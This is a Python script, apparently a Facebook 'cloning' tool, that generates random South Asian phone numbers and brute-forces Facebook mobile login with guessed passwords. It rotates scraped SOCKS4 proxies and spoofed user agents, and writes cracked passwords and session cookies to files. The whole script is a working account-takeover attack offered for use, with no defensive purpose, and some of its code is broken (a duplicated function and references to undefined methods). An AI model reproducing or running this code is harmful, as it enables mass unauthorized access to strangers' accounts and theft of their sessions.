#───────────➤ IMPORT ➤───────────#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform
from concurrent.futures import ThreadPoolExecutor as Sumonxd
from datetime import datetime
#───────────➤ PROXY ➤───────────#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)
#───────────➤ USER-AGENT ➤───────────#
def ___ua___():
	mobile_version=f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	chrome_version=f"{str(random.randint(40,113))}.0.{str(random.randint(3000,5999))}.{str(random.randint(10,299))}"
	build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
	numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
	samsung=random.choice(["RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","RMX2180"])
	ua1=f'Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 OPR/{str(random.randint(10,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	ua2=f"Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randrange(80,120))}.0.{str(random.randint(4200,5700))}.{str(random.randrange(40,150))} Mobile Safari/537.36"
	ua3=f'Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36'
	ua4=f'Mozilla/5.0 (Linux; Android {mobile_version}; {samsung} Build/{build}{numbr}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 OPR/{str(random.randint(10,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
	return random.choice([ua1,ua2,ua3,ua4])
#───────────➤ LOOP ➤───────────#
id,memek,loop,ok,cp=[],[],0,0,0
#───────────➤ COLOUR ➤───────────#
w='\x1b[1;97m';g='\x1b[38;5;48m';b='\x1b[38;5;8m';y="\033[1;33m";p="\33[1;34m"
#───────────➤ STYLE ➤───────────#
xd=f"{g}➤{w}";xd1=f"{g}➤{w}1{w}";xd2=f"{g}➤{w}2{w}";xd3=f"{g}➤{w}3{w}";xd4=f"{g}➤{w}4{w}";xd5=f"{g}➤{w}5{w}";xd0=f"{g}➤{w}0{w}";xdxx=f"{g}➤{w}?{w}"
#───────────➤ LINEX ➤───────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{p}──────────────────────────────────────────────────')
#───────────➤ LOGO ➤───────────#
logo=(f"""
\033[1;37m $$$$$$\  $$\       $$$$$$\ $$\   $$\ $$\       $$\        $$$$$$\  $$\   $$\ 
\033[1;37m $$  __$$\ $$ |      \_$$  _|$$ |  $$ |$$ |      $$ |      $$  __$$\ $$ |  $$ |
\033[1;37m $$ /  $$ |$$ |        $$ |  $$ |  $$ |$$ |      $$ |      $$ /  $$ |$$ |  $$ |
\033[1;37m $$$$$$$$ |$$ |        $$ |  $$ |  $$ |$$ |      $$ |      $$$$$$$$ |$$$$$$$$ |
\033[1;37m $$  __$$ |$$ |        $$ |  $$ |  $$ |$$ |      $$ |      $$  __$$ |$$  __$$ |
\033[1;37m $$ |  $$ |$$ |        $$ |  $$ |  $$ |$$ |      $$ |      $$ |  $$ |$$ |  $$ |
\033[1;37m $$ |  $$ |$$$$$$$$\ $$$$$$\ \$$$$$$  |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |$$ |  $$ |
\033[1;37m \__|  \__|\________|\______| \______/ \________|\________|\__|  \__|\__|  \__|
{p}──────────────────────────────────────────────────
{xd} OWNER {xd} Sumon Chowdhury
{xd} TOOLS {xd} RANDOM ALL COUNTRY
{p}──────────────────────────────────────────────────""")
#───────────➤ MENU ➤───────────#
def ________menu________():
    clear();print(f'{xd1} RANDOM CLONING ');print(f'{xd0} EXIT CLONING ');linex();option=input(f"{xdxx} SELECT {xd} ")
    if option in ['1','A']:______randmx_____()
    else:exit()
#───────────➤ MENU ➤───────────#
def ______randmx_____():
    clear();print(f'{xd1} RANDOM {g}●{w}BD{g}●{w} CLONING ');print(f'{xd2} RANDOM {g}●{w}INDIA{g}●{w} CLONING ');print(f'{xd3} RANDOM {g}●{w}NEPAL{g}●{w} CLONING ');print(f'{xd4} RANDOM {g}●{w}PAKISTAN{g}●{w} CLONING ');print(f'{xd0} EXIT CLONING ');linex();option=input(f"{xdxx} SELECT {xd} ")
    if option in ['1']:______bdx_____()
    if option in ['2']:______indiax_____()
    if option in ['3']:______nepalx_____()
    if option in ['4']:______pakistanx_____()
    else:exit()
#───────────➤ RANDOM BD ➤───────────#
user=[]
def ______bdx_____():
	clear();print(f"{xd} EXAMPLE {xd} 01317 {g}●{w} 01728 {g}●{w} 01610 {g}●{w} 01834 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(6));user.append(nmp)
	with Sumonxd(max_workers=30) as Sumonxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [uid,love,uid[:7],uid[:6],uid[:8]]
			if methd in ["1"]:Sumonxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:Sumonxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:Sumonxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:Sumonxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:Sumonxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM INDIA ➤───────────#
user=[]
def ______indiax_____():
	clear();print(f"{xd} EXAMPLE {xd} +91639 {g}●{w} +91827 {g}●{w} +98752 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
	with Sumonxd(max_workers=30) as Sumonxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [love,uid[:8],'57273200','59039200','57575751']
			if methd in ["1"]:Sumonxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:Sumonxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:Sumonxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:Sumonxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:Sumonxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM NEPAL ➤───────────#
user=[]
def ______nepalx_____():
	clear();print(f"{xd} EXAMPLE {xd} 9815 {g}●{w} 9814 {g}●{w} 9861 {g}●{w} 9840 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(6));user.append(nmp)
	with Sumonxd(max_workers=30) as Sumonxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [uid,love,uid[:8],uid[:7],uid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
			if methd in ["1"]:Sumonxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:Sumonxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:Sumonxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:Sumonxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:Sumonxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM PAKISTAN ➤───────────#
user=[]
def ______pakistanx_____():
	clear();print(f"{xd} EXAMPLE {xd} 0306 {g}●{w} 0335 {g}●{w} 0315 {g}●{w} 0345 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
	with Sumonxd(max_workers=30) as Sumonxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [love,uid,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
			if methd in ["1"]:Sumonxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:Sumonxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:Sumonxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:Sumonxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:Sumonxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM AFGHANISTAN ➤───────────#
user=[]
def ______pakistanx_____():
	clear();print(f"{xd} EXAMPLE {xd} +9340 {g}●{w} +9360 {g}●{w} +9330 {g}●{w} +9350 ");linex();code=input(f"{xdxx} SELECT {xd} ");clear();print(f"{xd1} METHOD {g}●{w}R1{g}●{w}");print(f"{xd2} METHOD {g}●{w}R2{g}●{w}");linex();methd=input(f"{xdxx} SELECT {xd} ")
	limit = str(random.randint(30000,70000))
	for nmbr in range(int(limit)):nmp = ''.join(random.choice(string.digits) for _ in range(7));user.append(nmp)
	with Sumonxd(max_workers=30) as Sumonxxx:
		clear();tl = str(len(user))
		print(f'{xd} SIM CODE {xd} {code} {xd} TOTAL UID {xd} {tl} {xd} R{methd}');linex()
		for love in user:
			uid = code+love
			pwx = [love,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
			if methd in ["1"]:Sumonxxx.submit(______R1______,uid,pwx)
			if methd in ["2"]:Sumonxxx.submit(______R2______,uid,pwx)
			if methd in ["3"]:Sumonxxx.submit(______R3______,uid,pwx)
			if methd in ["4"]:Sumonxxx.submit(______R4______,uid,pwx)
			if methd in ["5"]:Sumonxxx.submit(______R5______,uid,pwx)
	print('');linex();print(f'{xd} THE PROCESS HAS BEEN COMPLETED');print(f'{xd} TOTAL OK {xd} {str(len(ok))}');print(f'{xd} TOTAL CP {xd} {str(len(cp))}');linex();exit()
#───────────➤ RANDOM METHOD HOST R1 ➤───────────#
def ______R1______(uid,pwx):
	global loop,ok,cp
	sys.stdout.write(f'\r\r{xd} Sumon•XD {loop} {ok}|{cp} ');sys.stdout.flush()
	ewe = requests.Session()
	ua = "Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190"
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {'http': 'socks4://'+random.choice(xx)}
			link = ewe.get("https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
			"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
			"try_number": 0,
			"unrecognized_tries": 0,
			"email": uid,
			"prefill_contact_point": uid,
			"prefill_source": "browser_dropdown",
			"prefill_type": "contact_point",
			"first_prefill_source": "browser_dropdown",
			"first_prefill_type": "contact_point",
			"had_cp_prefilled": True,
			"had_password_prefilled": False,
			"is_smart_lock": False,
			"bi_xrwh": 0,
			"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
			"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
			"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			headers = {"Host": "p.facebook.com",
			"content-length": str(len((data))),
			"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"x-response-format": "JSONStream",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			"viewport-width": "360",
			"x-requested-with": "XMLHttpRequest",
			"x-asbd-id": "129477",
			"dpr": "2",
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://p.facebook.com",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": "https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,headers = headers,allow_redirects = False,proxies = zz)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r\r{xd}{y} Sumon-CP {ids} {w}●{y} {pw} ")
				cp+=1
				open('/sdcard/Sumon-R1-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', kuki)[0]
				bal_remove = str(requests.get(f'https://graph.facebook.com/'+ids+'/picture?type=normal').text)
				if 'Photoshop' in bal_remove:
					print(f"\r\r{xd}{g} Sumon-OK {ids} {w}●{g} {pw} ")
					print(f"\r\r{xd}{g} BISCUITS {xd} {kuki}")
					print(f'{p}──────────────────────────────────────────────────')
					ok+=1
					open('/sdcard/Sumon-R1-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+kuki+'\n')
				else:break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#───────────➤ RANDOM METHOD HOST R2 ➤───────────#
def ______R2______(uid,pwx):
	global loop,ok,cp
	sys.stdout.write(f'\r\r{xd} Sumon•XD {loop} {ok}|{cp} ');sys.stdout.flush()
	ewe = requests.Session()
	ua = ___ua___()
	for pw in pwx:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {'http': 'socks4://'+random.choice(xx)}
			link = ewe.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
			"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
			"try_number": 0,
			"unrecognized_tries": 0,
			"email": uid,
			"prefill_contact_point": uid,
			"prefill_source": "browser_dropdown",
			"prefill_type": "contact_point",
			"first_prefill_source": "browser_dropdown",
			"first_prefill_type": "contact_point",
			"had_cp_prefilled": True,
			"had_password_prefilled": False,
			"is_smart_lock": False,
			"bi_xrwh": 0,
			"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
			"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
			"jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1),
			"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			headers = {"Host": "m.facebook.com",
			"content-length": str(len((data))),
			"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search('Chrome/(\d+).', str(ua)).group(1), re.search('Chrome/(\d+).', str(ua)).group(1)),
			"sec-ch-ua-mobile": "?1",
			"user-agent": ua,
			"x-response-format": "JSONStream",
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			"viewport-width": "360",
			"x-requested-with": "XMLHttpRequest",
			"x-asbd-id": "129477",
			"dpr": "2",
			"sec-ch-prefers-color-scheme": "light",
			"sec-ch-ua-platform": '"Android"',
			"accept": "*/*",
			"origin": "https://m.facebook.com",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,headers = headers,allow_redirects = False,proxies = zz)
			if "checkpoint" in ewe.cookies.get_dict():
				ids = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				print(f"\r\r{xd}{y} Sumon-CP {ids} {w}●{y} {pw} ")
				cp+=1
				open('/sdcard/Sumon-R2-RANDM-CP.txt','a').write(ids+'●'+pw+'\n')
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				ids = re.findall('c_user=(.*);xs', kuki)[0]
				bal_remove = str(requests.get(f'https://graph.facebook.com/'+ids+'/picture?type=normal').text)
				if 'Photoshop' in bal_remove:
					print(f"\r\r{xd}{g} Sumon-OK {ids} {w}●{g} {pw} ")
					print(f"\r\r{xd}{g} BISCUITS {xd} {kuki}")
					print(f'{p}──────────────────────────────────────────────────')
					ok+=1
					open('/sdcard/Sumon-R2-RANDM-OK.txt','a').write(ids+'|'+pw+'|'+kuki+'\n')
				else:break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
#───────────➤ END ➤───────────#
________menu________()